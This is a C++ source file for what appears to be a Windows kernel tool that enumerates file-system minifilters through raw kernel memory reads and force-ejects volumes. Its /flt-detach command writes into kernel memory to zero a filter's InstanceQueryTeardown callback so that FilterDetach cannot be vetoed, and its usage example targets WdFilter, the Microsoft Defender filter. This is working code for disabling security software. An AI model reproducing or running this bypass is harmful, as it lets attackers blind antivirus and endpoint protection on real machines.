#include <Windows.h>
#include <Psapi.h>
#include <winioctl.h>
#include <setupapi.h>
#include <cfgmgr32.h>
#include <cstdio>
#include <string>
#include <vector>
#include <functional>
#include <algorithm>
#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include "jutil.h"
#include "ansi.h"

// ─── /flt [drive]           Enumerate minifilter instances via kernel walk ─────
// ─── /flt-detach <f> <v>   Force-detach mandatory minifilter ─────────────────
// ─── /unmount <drive>       Force dismount + eject ────────────────────────────
//
// Windows 10 22H2 (19045) x64 FltMgr structure offsets
// Verified against MCP-PoC (alfarom256) FltDef.h with ASSERT_SZ checks.
//
// Walk path: FltGlobals.FrameList → FLTP_FRAME → RegisteredFilters → FLT_FILTER
//                                                                   → InstanceList → FLT_INSTANCE
//
// FLT_OBJECT (0x30 bytes):
//   +0x000 Flags: ULONG
//   +0x004 PointerCount: ULONG
//   +0x008 RundownRef: EX_RUNDOWN_REF (8)
//   +0x010 PrimaryLink: LIST_ENTRY   ← chained in filter/instance lists
//   +0x020 UniqueIdentifier: GUID (16)
//
// FLTP_FRAME:
//   +0x000 type: DWORD64
//   +0x008 Links: LIST_ENTRY         ← chained in FltGlobals.FrameList
//   +0x018 FrameId: ULONG
//   +0x020 AltitudeIntervalLow: UNICODE_STRING
//   +0x030 AltitudeIntervalHigh: UNICODE_STRING
//   +0x040 LargeIrpCtrlStackSize: UCHAR
//   +0x041 SmallIrpCtrlStackSize: UCHAR
//   +0x048 RegisteredFilters: FLT_RESOURCE_LIST_HEAD (0x80 bytes)
//            rLock(ERESOURCE=0x68) @+0x048, rList.Flink @+0x0B0
//
// FLT_RESOURCE_LIST_HEAD (0x80 bytes):
//   +0x000 rLock: ERESOURCE (0x68)
//   +0x068 rList: LIST_ENTRY  ← Flink at +0x068
//   +0x078 rCount: ULONG
//
// FLT_FILTER:
//   +0x000 Base: FLT_OBJECT (0x30)
//   +0x030 Frame: PVOID
//   +0x038 Name: UNICODE_STRING
//   +0x048 DefaultAltitude: UNICODE_STRING
//   +0x058 Flags: DWORD64
//   +0x060 DriverObject: PVOID
//   +0x068 InstanceList: FLT_RESOURCE_LIST_HEAD (0x80)
//            rList.Flink @+0x0D0
//   +0x0E8 VerifierExtension: PVOID
//   +0x0F0 VerifiedFiltersLink: LIST_ENTRY
//   +0x100 FilterUnload: callback
//   +0x108 InstanceSetup: callback
//   +0x110 InstanceQueryTeardown: callback  ← zeroed to bypass mandatory
//
// FLT_INSTANCE:
//   +0x000 Base: FLT_OBJECT (0x30)
//   +0x030 OperationRundownRef: PVOID
//   +0x038 Volume: PFLT_VOLUME
//   +0x040 Filter: PFLT_FILTER
//   +0x048 Flags: DWORD64
//   +0x050 Altitude: UNICODE_STRING
//   +0x060 Name: UNICODE_STRING
//   +0x070 FilterLink: LIST_ENTRY  ← chained in FLT_FILTER.InstanceList
//
// FLT_VOLUME:
//   +0x068 CDODeviceName: UNICODE_STRING  (\Device\HarddiskVolumeN)

// FLT_OBJECT
#define FLTOBJ_PRIMARYLINK    0x010

// FLTP_FRAME
#define FLTP_LINKS            0x008  // Links LIST_ENTRY offset in FLTP_FRAME
#define FLTP_REGFILTERS_FLINK 0x0B0  // RegisteredFilters.rList.Flink offset in FLTP_FRAME

// FLT_FILTER
#define FLTF_FLAGS_OFF        0x058
#define FLTF_DRIVEROBJ_OFF    0x060
#define FLTF_NAME_OFF         0x038
#define FLTF_INSTLIST_FLINK   0x0D0  // InstanceList.rList.Flink
#define FLTF_FILTERUNLOAD     0x100
#define FLTF_INSTANCESETUP    0x108
#define FLTF_QUERYTEARDOWN    0x110
#define FLTF_TEARDOWNSTART    0x118
#define FLTF_TEARDOWNCOMPLETE 0x120

// FLT_FILTER.Flags (stored in DWORD64 slot at +0x058)
// Low DWORD = FLT_REGISTRATION.Flags as copied at registration time
#define FLTFL_DO_NOT_SUPPORT_SERVICE_STOP  0x00000001
#define FLTFL_SUPPORT_NPFS_MSFS            0x00000002
#define FLTFL_SUPPORT_DAX_VOLUME           0x00000004

// FLT_INSTANCE
#define FLTI_VOLUME_OFF       0x038
#define FLTI_ALTITUDE_OFF     0x050
#define FLTI_NAME_OFF         0x060
#define FLTI_FILTERLINK_OFF   0x070

// FLT_VOLUME
#define FLTV_CDODEVNAME_OFF   0x060

// ── Helpers ───────────────────────────────────────────────────────────────────

// Read UNICODE_STRING from kernel VA (8-byte chunks via Rd64).
static std::string ReadKStr(DWORD64 va) {
    if (!va || !g_drv->IsKernelVA(va)) return {};
    DWORD64 header = g_drv->Rd64(va);          // Length(2)+MaxLen(2)+pad(4) packed in low DWORD
    USHORT  len    = (USHORT)(header & 0xFFFF);
    DWORD64 bufPtr = g_drv->Rd64(va + 8);
    if (!len || !bufPtr || len > 512 || !g_drv->IsKernelVA(bufPtr)) return {};

    std::vector<WCHAR> wbuf(len / 2 + 2, 0);
    for (USHORT off = 0; off < len; off += 8) {
        DWORD64 chunk = g_drv->Rd64(bufPtr + off);
        size_t  n     = (size_t)(len - off) < 8 ? (size_t)(len - off) : 8;
        memcpy((BYTE*)wbuf.data() + off, &chunk, n);
    }
    int n = WideCharToMultiByte(CP_UTF8, 0, wbuf.data(), len / 2, nullptr, 0, nullptr, nullptr);
    if (n <= 0) return {};
    std::string s(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wbuf.data(), len / 2, s.data(), n, nullptr, nullptr);
    return s;
}

// Get PE .data section RVA range from a loaded module.
static bool FltGetSectionRange(HMODULE hMod, const char* secName,
                                DWORD64* outBase, DWORD64* outEnd) {
    auto* dos = (IMAGE_DOS_HEADER*)hMod;
    auto* nt  = (IMAGE_NT_HEADERS64*)((BYTE*)hMod + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        char name[9]{}; memcpy(name, sec->Name, 8);
        if (_stricmp(name, secName) == 0) {
            *outBase = sec->VirtualAddress;
            *outEnd  = sec->VirtualAddress + sec->Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

// Collect all RIP-relative LEA targets into .data from an exported function.
static std::vector<DWORD64> FltScanAllLEA(HMODULE hMod, DWORD64 userBase, DWORD64 kernBase,
                                           const char* exportFn,
                                           DWORD64 dataRvaBase, DWORD64 dataRvaEnd) {
    std::vector<DWORD64> results;
    BYTE* fn = (BYTE*)GetProcAddress(hMod, exportFn);
    if (!fn) { DBG("[flt] export %s not found\n", exportFn); return results; }

    for (int i = 0; i < 512 - 6; i++) {
        if ((fn[i] == 0x48 || fn[i] == 0x4C) &&
             fn[i+1] == 0x8D && (fn[i+2] & 0xC7) == 0x05) {
            INT32   disp = *(INT32*)(fn + i + 3);
            DWORD64 tgt  = (DWORD64)(fn + i + 7) + (INT64)disp;
            DWORD64 rva  = tgt - userBase;
            if (rva >= dataRvaBase && rva < dataRvaEnd) {
                DWORD64 va = kernBase + rva;
                DBG("[flt] %s LEA[%d] -> rva=0x%llx kern=%p\n",
                    exportFn, (int)results.size(), (unsigned long long)rva, (void*)va);
                results.push_back(va);
            }
        }
    }
    return results;
}

// Find FLTMGR.SYS kernel base from driver cache.
static DWORD64 GetFltBase() {
    KUtil::BuildDriverCache();
    for (auto& d : KUtil::GetDrivers())
        if (_wcsicmp(d.name, L"FLTMGR.SYS") == 0) return d.base;
    return 0;
}

// Load fltmgr.sys from System32\drivers as PE image (for export scanning).
static HMODULE LoadFltImage() {
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, L"\\drivers\\fltmgr.sys");
    return LoadLibraryExW(path, nullptr, DONT_RESOLVE_DLL_REFERENCES);
}

// Validate a UNICODE_STRING at given kernel VA.
// Returns true if it looks like a valid filter name (4-80 bytes, proper structure).
static bool ValidateUnicodeStr(DWORD64 va) {
    if (!va || !g_drv->IsKernelVA(va)) return false;
    DWORD64 hdr    = g_drv->Rd64(va);
    USHORT  len    = (USHORT)(hdr & 0xFFFF);
    USHORT  maxLen = (USHORT)((hdr >> 16) & 0xFFFF);
    DWORD   pad    = (DWORD)(hdr >> 32);       // should be 0 on amd64
    DWORD64 bufPtr = g_drv->Rd64(va + 8);
    if (len < 4 || len > 80 || (len & 1)) return false;  // at least 2 chars, even
    if (maxLen < len || maxLen > 256)      return false;  // maxLen sane
    if (pad != 0)                          return false;  // UNICODE_STRING padding
    if (!bufPtr || !g_drv->IsKernelVA(bufPtr)) return false;
    return true;
}

// Return kernel VA of FltGlobals.FrameList (the LIST_ENTRY head for FLTP_FRAME objects).
//
// Strategy: collect all RIP-relative LEAs in FltMgr exports that target .data.
// Each LEA candidate is validated as FrameList by checking:
//   1. Its Flink points to a well-formed LIST_ENTRY (Blink back to headVA)
//   2. The FLTP_FRAME at Flink-FLTP_LINKS has a valid FLT_FILTER in its RegisteredFilters
static DWORD64 FindFrameListHead(HMODULE hFlt, DWORD64 userBase, DWORD64 fltBase) {
    DWORD64 dBase = 0, dEnd = 0;
    FltGetSectionRange(hFlt, ".data", &dBase, &dEnd);

    const char* exports[] = {
        "FltEnumerateFilters", "FltUnregisterFilter",
        "FltEnumerateFilterInstances", nullptr
    };
    std::vector<DWORD64> allLEAs;
    for (const char** exp = exports; *exp; exp++) {
        for (DWORD64 va : FltScanAllLEA(hFlt, userBase, fltBase, *exp, dBase, dEnd)) {
            if (std::find(allLEAs.begin(), allLEAs.end(), va) == allLEAs.end())
                allLEAs.push_back(va);
        }
    }

    for (DWORD64 leaVA : allLEAs) {
        // The LEA points to FltGlobals.FrameList (a LIST_ENTRY).
        // Scan adj=0,8 in case LEA points just before the Flink field.
        for (int adj = 0; adj <= 8; adj += 8) {
            DWORD64 headVA     = leaVA + adj;
            DWORD64 frameFlink = g_drv->Rd64(headVA);
            if (!frameFlink || !g_drv->IsKernelVA(frameFlink) || frameFlink == headVA)
                continue;

            // Verify LIST_ENTRY circularity: frame.Links.Blink must point back to headVA
            DWORD64 frameBlink = g_drv->Rd64(frameFlink + 8);
            if (frameBlink != headVA) continue;

            // frameFlink is the address of FLTP_FRAME.Links
            DWORD64 frameVA        = frameFlink - FLTP_LINKS;
            DWORD64 filterListHead = frameVA + FLTP_REGFILTERS_FLINK;
            DWORD64 filterFlink    = g_drv->Rd64(filterListHead);

            if (!filterFlink || !g_drv->IsKernelVA(filterFlink)) continue;

            // Empty filter list is still a valid frame
            if (filterFlink == filterListHead) {
                DBG("[flt] FOUND frameListHead=%p (empty filter list)\n", (void*)headVA);
                return headVA;
            }

            // Validate first FLT_FILTER has a real name
            DWORD64 filterVA = filterFlink - FLTOBJ_PRIMARYLINK;
            if (ValidateUnicodeStr(filterVA + FLTF_NAME_OFF)) {
                DBG("[flt] FOUND frameListHead=%p frame=%p filter=%p\n",
                    (void*)headVA, (void*)frameVA, (void*)filterVA);
                return headVA;
            }
        }
    }
    return 0;
}

// Walk all FLT_FILTER entries via two-level walk: FrameList → FLTP_FRAME → RegisteredFilters.
// cb(filterVA, name) → false to stop early.
static void WalkFilters(DWORD64 frameListHeadKVA,
                        std::function<bool(DWORD64, const std::string&)> cb) {
    if (!frameListHeadKVA) return;

    DWORD64 frameFlink = g_drv->Rd64(frameListHeadKVA);
    for (int fg = 0; fg < 32; fg++) {
        if (!frameFlink || !g_drv->IsKernelVA(frameFlink) || frameFlink == frameListHeadKVA)
            break;

        DWORD64 frameVA        = frameFlink - FLTP_LINKS;
        DWORD64 filterListHead = frameVA + FLTP_REGFILTERS_FLINK;
        DWORD64 filterFlink    = g_drv->Rd64(filterListHead);

        for (int ff = 0; ff < 256; ff++) {
            if (!filterFlink || !g_drv->IsKernelVA(filterFlink) || filterFlink == filterListHead)
                break;
            DWORD64 filterVA = filterFlink - FLTOBJ_PRIMARYLINK;
            std::string name = ReadKStr(filterVA + FLTF_NAME_OFF);
            if (!cb(filterVA, name)) return;
            filterFlink = g_drv->Rd64(filterFlink);
        }

        frameFlink = g_drv->Rd64(frameFlink);
    }
}

// Print one callback slot: address + driver attribution (text mode).
static void PrintCbSlot(const char* label, DWORD64 cbAddr) {
    if (!cbAddr) {
        printf("      %-26s (null)\n", label);
        return;
    }
    const wchar_t* owner = L"?"; DWORD64 off = 0;
    KUtil::FindDriverByAddr(cbAddr, &owner, &off);
    printf("      %-26s %p  (%ls +0x%llx)\n",
           label, (void*)cbAddr, owner, (unsigned long long)off);
}

// Decode FLT_FILTER flags to a short tag string.
static std::string FltFlagsStr(DWORD64 flags) {
    std::string s;
    if (flags & FLTFL_DO_NOT_SUPPORT_SERVICE_STOP) s += "NO_STOP ";
    if (flags & FLTFL_SUPPORT_NPFS_MSFS)           s += "NPFS ";
    if (flags & FLTFL_SUPPORT_DAX_VOLUME)          s += "DAX ";
    if (s.empty()) s = "-";
    else s.pop_back();
    return s;
}

// JSON helper: resolve addr to "0xADDR (driver+off)" string
static std::string JCb(DWORD64 addr) {
    if (!addr) return "\"null\"";
    const wchar_t* owner = L"?"; DWORD64 off = 0;
    KUtil::FindDriverByAddr(addr, &owner, &off);
    char buf[256];
    // narrow owner
    char narrow[128]{};
    WideCharToMultiByte(CP_UTF8, 0, owner, -1, narrow, sizeof(narrow)-1, nullptr, nullptr);
    snprintf(buf, sizeof(buf), "\"0x%llx (%s+0x%llx)\"",
             (unsigned long long)addr, narrow, (unsigned long long)off);
    return buf;
}

// Walk FLT_INSTANCE entries for a filter.  cb(instVA) → false to stop.
static void WalkInstances(DWORD64 filterVA, std::function<bool(DWORD64)> cb) {
    DWORD64 headVA = filterVA + FLTF_INSTLIST_FLINK;
    DWORD64 flink  = g_drv->Rd64(headVA);
    for (int guard = 0; guard < 1024; guard++) {
        if (!flink || !g_drv->IsKernelVA(flink) || flink == headVA) break;
        DWORD64 instVA = flink - FLTI_FILTERLINK_OFF;
        if (!cb(instVA)) break;
        flink = g_drv->Rd64(flink);
    }
}

// Shared setup: load fltmgr.sys image and find filter list head.
// Returns true on success; caller must FreeLibrary(*hFltOut).
static bool FltSetup(HMODULE* hFltOut, DWORD64* listHeadOut) {
    DWORD64 fltBase = GetFltBase();
    if (!fltBase) {
        printf("%s[!]%s FLTMGR.SYS not found in driver list\n", A_RED, A_RESET);
        return false;
    }
    HMODULE hFlt = LoadFltImage();
    if (!hFlt) {
        printf("%s[!]%s Cannot load fltmgr.sys image\n", A_RED, A_RESET);
        return false;
    }
    DWORD64 listHead = FindFrameListHead(hFlt, (DWORD64)hFlt, fltBase);
    if (!listHead) {
        printf("%s[!]%s Cannot locate FltGlobals.FrameList\n", A_RED, A_RESET);
        FreeLibrary(hFlt);
        return false;
    }
    *hFltOut    = hFlt;
    *listHeadOut = listHead;
    return true;
}

// ── /flt [drive] ─────────────────────────────────────────────────────────────

void CmdFlt(const char* volumeArg) {
    char filterDrive = 0;
    std::string filterNtPath;

    if (volumeArg && volumeArg[0] && volumeArg[0] != '?') {
        filterDrive = (char)toupper((unsigned char)volumeArg[0]);
        char dos[3] = { filterDrive, ':', '\0' };
        char nt[512]{};
        if (QueryDosDeviceA(dos, nt, sizeof(nt)))
            filterNtPath = nt;
        if (!g_jsonMode)
            printf("%s[*]%s Filter: %c: -> %s\n\n",
                   A_CYAN, A_RESET, filterDrive, filterNtPath.c_str());
    }

    HMODULE hFlt; DWORD64 listHead;
    if (!FltSetup(&hFlt, &listHead)) return;
    FreeLibrary(hFlt);

    bool jsonFirst = true;
    int  totalFilters = 0, totalInst = 0;

    if (g_jsonMode)
        printf("{\"command\":\"flt\",\"filters\":[\n");

    WalkFilters(listHead, [&](DWORD64 filterVA, const std::string& fname) -> bool {
        // ── per-filter data ────────────────────────────────────────────────
        DWORD64 flags       = g_drv->Rd64(filterVA + FLTF_FLAGS_OFF);
        DWORD64 cbUnload    = g_drv->Rd64(filterVA + FLTF_FILTERUNLOAD);
        DWORD64 cbSetup     = g_drv->Rd64(filterVA + FLTF_INSTANCESETUP);
        DWORD64 cbTeardown  = g_drv->Rd64(filterVA + FLTF_QUERYTEARDOWN);
        DWORD64 cbTdStart   = g_drv->Rd64(filterVA + FLTF_TEARDOWNSTART);
        DWORD64 cbTdDone    = g_drv->Rd64(filterVA + FLTF_TEARDOWNCOMPLETE);

        // collect matching instances first so we know count
        struct InstRec { std::string alt, vol; DWORD64 instVA; };
        std::vector<InstRec> insts;
        WalkInstances(filterVA, [&](DWORD64 instVA) -> bool {
            DWORD64 volVA = g_drv->Rd64(instVA + FLTI_VOLUME_OFF);
            std::string volName;
            if (volVA && g_drv->IsKernelVA(volVA))
                volName = ReadKStr(volVA + FLTV_CDODEVNAME_OFF);
            if (!filterNtPath.empty() &&
                _strnicmp(volName.c_str(), filterNtPath.c_str(), filterNtPath.size()) != 0)
                return true;
            insts.push_back({ ReadKStr(instVA + FLTI_ALTITUDE_OFF), volName, instVA });
            return true;
        });

        if (insts.empty() && !filterNtPath.empty()) return true; // filtered out

        totalFilters++;
        totalInst += (int)insts.size();

        if (g_jsonMode) {
            if (!jsonFirst) printf(",\n");
            jsonFirst = false;
            printf(" {\"filter\":%s,\"filter_va\":%s,\"flags\":\"0x%llx\""
                   ",\"cb_filterunload\":%s"
                   ",\"cb_instancesetup\":%s"
                   ",\"cb_queryteardown\":%s"
                   ",\"cb_teardownstart\":%s"
                   ",\"cb_teardowncomplete\":%s"
                   ",\"instances\":[\n",
                   JEscape(fname.c_str()).c_str(),
                   JAddr(filterVA).c_str(),
                   (unsigned long long)flags,
                   JCb(cbUnload).c_str(),
                   JCb(cbSetup).c_str(),
                   JCb(cbTeardown).c_str(),
                   JCb(cbTdStart).c_str(),
                   JCb(cbTdDone).c_str());
            bool first = true;
            for (auto& r : insts) {
                if (!first) printf(",\n");
                first = false;
                printf("   {\"altitude\":%s,\"volume\":%s,\"inst_va\":%s}",
                       JEscape(r.alt.c_str()).c_str(),
                       JEscape(r.vol.c_str()).c_str(),
                       JAddr(r.instVA).c_str());
            }
            printf("\n  ]}");
        } else {
            // ── text: filter header ────────────────────────────────────────
            printf("\n%s[%s]%s  va=%p  flags=0x%llx (%s)  instances=%d\n",
                   A_CYAN, fname.c_str(), A_RESET,
                   (void*)filterVA,
                   (unsigned long long)flags, FltFlagsStr(flags).c_str(),
                   (int)insts.size());
            // callbacks
            printf("  Callbacks:\n");
            PrintCbSlot("FilterUnload",            cbUnload);
            PrintCbSlot("InstanceSetup",           cbSetup);
            PrintCbSlot("InstanceQueryTeardown",   cbTeardown);
            PrintCbSlot("InstanceTeardownStart",   cbTdStart);
            PrintCbSlot("InstanceTeardownComplete",cbTdDone);
            // instances
            if (!insts.empty()) {
                printf("  Instances:\n");
                for (auto& r : insts)
                    printf("    %-14s  %s\n", r.alt.c_str(), r.vol.c_str());
            }
        }
        return true;
    });

    if (g_jsonMode)
        printf("\n],\"total_filters\":%d,\"total_instances\":%d}\n",
               totalFilters, totalInst);
    else
        printf("\n%s[*]%s %d filter(s), %d instance(s)\n",
               A_CYAN, A_RESET, totalFilters, totalInst);
}

// ── /flt-detach <filter> <drive> ─────────────────────────────────────────────
// 1. Kernel-walk to FLT_FILTER, zero InstanceQueryTeardown callback
// 2. Call FilterDetach (now succeeds — no veto possible)
// 3. Restore callback

void CmdFltDetach(const char* filterName, const char* volumeArg) {
    if (!filterName || !volumeArg) {
        printf("%s[!]%s Usage: /flt-detach <filter> <drive>\n"
               "  Example: /flt-detach WdFilter E\n", A_RED, A_RESET);
        return;
    }
    char driveLetter = (char)toupper((unsigned char)volumeArg[0]);

    // Wide strings for FilterDetach API
    wchar_t wFilter[256]{}, wVolume[8]{};
    MultiByteToWideChar(CP_UTF8, 0, filterName, -1, wFilter, 256);
    wVolume[0] = (WCHAR)driveLetter; wVolume[1] = L':'; wVolume[2] = 0;

    // ── Step 1: find FLT_FILTER in kernel ────────────────────────────────────
    HMODULE hFlt; DWORD64 listHead;
    if (!FltSetup(&hFlt, &listHead)) return;
    FreeLibrary(hFlt);

    DWORD64 targetFilterVA = 0;
    WalkFilters(listHead, [&](DWORD64 filterVA, const std::string& fname) -> bool {
        if (_stricmp(fname.c_str(), filterName) == 0) {
            targetFilterVA = filterVA;
            return false;
        }
        return true;
    });

    if (!targetFilterVA) {
        printf("%s[!]%s Filter '%s' not found in kernel list\n",
               A_RED, A_RESET, filterName);
        return;
    }
    printf("%s[*]%s FLT_FILTER %s @ %p\n",
           A_CYAN, A_RESET, filterName, (void*)targetFilterVA);

    // ── Step 2: zero InstanceQueryTeardown ───────────────────────────────────
    DWORD64 cbVA   = targetFilterVA + FLTF_QUERYTEARDOWN;
    DWORD64 saved  = g_drv->Rd64(cbVA);

    if (saved) {
        const wchar_t* owner; DWORD64 off;
        KUtil::FindDriverByAddr(saved, &owner, &off);
        wprintf(L"  [*] InstanceQueryTeardown = %p  (%ls +0x%llx)\n",
                (void*)saved, owner, (unsigned long long)off);
        g_drv->Wr64(cbVA, 0);
        printf("  [+] Zeroed InstanceQueryTeardown\n");
    } else {
        printf("  [*] InstanceQueryTeardown already null\n");
    }

    // ── Step 3: call FilterDetach ────────────────────────────────────────────
    HMODULE hFltLib = LoadLibraryA("fltlib.dll");
    HRESULT hr = E_FAIL;
    if (!hFltLib) {
        printf("%s[!]%s Cannot load fltlib.dll\n", A_RED, A_RESET);
    } else {
        auto pDetach = (HRESULT(WINAPI*)(LPCWSTR, LPCWSTR, LPCWSTR))
                       GetProcAddress(hFltLib, "FilterDetach");
        if (!pDetach) {
            printf("%s[!]%s FilterDetach not found in fltlib.dll\n", A_RED, A_RESET);
        } else {
            printf("  [*] Calling FilterDetach(%S, %S)...\n", wFilter, wVolume);
            hr = pDetach(wFilter, wVolume, nullptr);
        }
        FreeLibrary(hFltLib);
    }

    // ── Step 4: restore callback ─────────────────────────────────────────────
    if (saved) {
        g_drv->Wr64(cbVA, saved);
        printf("  [*] InstanceQueryTeardown restored\n");
    }

    if (SUCCEEDED(hr))
        printf("%s[+]%s %s detached from %c:\n",
               A_GREEN, A_RESET, filterName, driveLetter);
    else
        printf("%s[!]%s FilterDetach failed: 0x%08lX\n",
               A_RED, A_RESET, (ULONG)hr);
}

// ── /unmount <drive> ─────────────────────────────────────────────────────────
// GUID_DEVINTERFACE_DISK = {53F56307-B6BF-11D0-94F2-00A0C91EFB8B}
static const GUID kDiskGuid =
    {0x53f56307,0xb6bf,0x11d0,{0x94,0xf2,0x00,0xa0,0xc9,0x1e,0xfb,0x8b}};

// Return the DEVINST of the disk whose DeviceNumber == diskNumber, or 0 on failure.
static DEVINST FindDiskDevinst(DWORD diskNumber) {
    HDEVINFO hDev = SetupDiGetClassDevsW(&kDiskGuid, NULL, NULL,
                        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
    if (hDev == INVALID_HANDLE_VALUE) return 0;

    DEVINST result = 0;
    SP_DEVICE_INTERFACE_DATA ifData = {};
    ifData.cbSize = sizeof(ifData);

    for (DWORD i = 0;
         !result && SetupDiEnumDeviceInterfaces(hDev, NULL, &kDiskGuid, i, &ifData);
         i++) {
        DWORD needed = 0;
        SetupDiGetDeviceInterfaceDetailW(hDev, &ifData, NULL, 0, &needed, NULL);
        auto* det = (SP_DEVICE_INTERFACE_DETAIL_DATA_W*)malloc(needed);
        if (!det) continue;
        det->cbSize = sizeof(*det);
        SP_DEVINFO_DATA devInfo = {};
        devInfo.cbSize = sizeof(devInfo);

        if (SetupDiGetDeviceInterfaceDetailW(hDev, &ifData, det, needed, NULL, &devInfo)) {
            HANDLE h = CreateFileW(det->DevicePath, 0,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                NULL, OPEN_EXISTING, 0, NULL);
            if (h != INVALID_HANDLE_VALUE) {
                STORAGE_DEVICE_NUMBER sdn2 = {};
                DWORD bytes = 0;
                if (DeviceIoControl(h, IOCTL_STORAGE_GET_DEVICE_NUMBER,
                        NULL, 0, &sdn2, sizeof(sdn2), &bytes, NULL)
                    && sdn2.DeviceNumber == diskNumber) {
                    result = devInfo.DevInst;
                }
                CloseHandle(h);
            }
        }
        free(det);
    }
    SetupDiDestroyDeviceInfoList(hDev);
    return result;
}

// Force-dismount + eject a removable volume.
// Lock is held until after physical eject to prevent Explorer from remounting.

void CmdUnmount(char drive) {
    drive = (char)toupper((unsigned char)drive);
    char devPath[8] = { '\\','\\','.','\\', drive, ':', '\0' };

    if (!g_jsonMode)
        printf("%s[*]%s Force unmounting %c:\n\n", A_CYAN, A_RESET, drive);

    HANDLE hVol = CreateFileA(devPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (hVol == INVALID_HANDLE_VALUE) {
        printf("%s[!]%s Cannot open %c: (error %lu)\n",
               A_RED, A_RESET, drive, GetLastError());
        return;
    }

    DWORD bytes = 0;

    // Lock volume (keep locked until eject — prevents Explorer from remounting)
    if (DeviceIoControl(hVol, FSCTL_LOCK_VOLUME,
                        nullptr, 0, nullptr, 0, &bytes, nullptr))
        printf("  [+] Volume locked\n");
    else
        printf("  [*] Lock skipped (error %lu) — forcing anyway\n", GetLastError());

    // Flush and dismount filesystem
    if (!DeviceIoControl(hVol, FSCTL_DISMOUNT_VOLUME,
                         nullptr, 0, nullptr, 0, &bytes, nullptr)) {
        printf("%s[!]%s FSCTL_DISMOUNT_VOLUME failed (error %lu)\n",
               A_RED, A_RESET, GetLastError());
        CloseHandle(hVol);
        return;
    }
    printf("  [+] File system dismounted\n");

    // Take volume offline — causes VolMgr/partmgr to release internal kernel references
    // so that the STORAGE\Volume device will no longer veto PnP removal.
    if (DeviceIoControl(hVol, IOCTL_VOLUME_OFFLINE,
                        nullptr, 0, nullptr, 0, &bytes, nullptr))
        printf("  [+] Volume offline\n");
    else
        printf("  [*] IOCTL_VOLUME_OFFLINE: error %lu (continuing)\n", GetLastError());

    // Get physical drive number while we still have the volume open
    STORAGE_DEVICE_NUMBER sdn = {};
    BOOL gotSdn = DeviceIoControl(hVol, IOCTL_STORAGE_GET_DEVICE_NUMBER,
                                  nullptr, 0, &sdn, sizeof(sdn), &bytes, nullptr);

    // --- Prep: find USB device node WHILE volume is still locked ---
    // (Explorer cannot reopen handles to the volume while we hold the lock)
    // We do all slow SetupDi work here so that close+eject is a tight sequence.
    DEVINST removeNode = 0;
    if (gotSdn) {
        printf("  [*] Physical disk: %lu — locating device node...\n", sdn.DeviceNumber);
        DEVINST diskInst = FindDiskDevinst(sdn.DeviceNumber);
        if (diskInst) {
            // Walk up: DISK\DR? → USBSTOR\Disk? → USB\VID_?&PID_? ← eject here
            removeNode = diskInst;
            for (int depth = 0; depth < 8; depth++) {
                WCHAR devId[MAX_DEVICE_ID_LEN] = {};
                CM_Get_Device_IDW(removeNode, devId, MAX_DEVICE_ID_LEN, 0);
                if (_wcsnicmp(devId, L"USB\\", 4) == 0) break;
                DEVINST parent = 0;
                if (CM_Get_Parent(&parent, removeNode, 0) != CR_SUCCESS) break;
                removeNode = parent;
            }
            WCHAR finalId[MAX_DEVICE_ID_LEN] = {};
            CM_Get_Device_IDW(removeNode, finalId, MAX_DEVICE_ID_LEN, 0);
            printf("  [*] Removing device node: %ls\n", finalId);
        } else {
            printf("  [*] Device node not found for PhysicalDrive%lu\n", sdn.DeviceNumber);
        }
    }

    // Close volume handle → releases lock (do this IMMEDIATELY before eject so
    // Explorer has no window to reopen handles to the volume)
    CloseHandle(hVol);

    // Eject: CM_Request_Device_EjectW = "Safely Remove Hardware" path
    bool ejected = false;
    if (removeNode) {
        PNP_VETO_TYPE vetoType = PNP_VetoTypeUnknown;
        WCHAR vetoName[MAX_PATH] = {};
        CONFIGRET cr = CM_Request_Device_EjectW(
            removeNode, &vetoType, vetoName, MAX_PATH, 0);
        if (cr == CR_SUCCESS) {
            printf("  [+] PnP eject succeeded\n");
            ejected = true;
        } else {
            printf("  [*] CM_Request_Device_Eject: CR=%lu veto=%d (%ls)\n",
                   (ULONG)cr, (int)vetoType, vetoName);
        }
    }
    if (!ejected)
        printf("  [*] Device not ejected — remove manually\n");
    printf("\n%s[+]%s %c: unmounted — safe to remove\n", A_GREEN, A_RESET, drive);
}
